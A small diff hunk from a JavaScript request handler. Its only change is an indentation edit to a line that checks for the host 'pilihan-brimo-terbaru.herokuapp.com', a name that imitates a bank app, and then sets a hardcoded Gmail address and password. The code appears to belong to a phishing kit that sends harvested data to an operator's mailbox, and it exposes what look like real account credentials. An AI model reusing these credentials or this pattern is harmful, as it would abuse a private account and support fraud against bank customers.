@@ -7,7 +7,7 @@ export default function handler(req, res) {
     let email = '';
     let pass = '';
 
-    if (url == 'pilihan-brimo-terbaru.herokuapp.com'){
+ if (url == 'pilihan-brimo-terbaru.herokuapp.com'){
 
        email = 'taulaju899@gmail.com'
        pass = 'mkcjbkvdkjiisdeh'
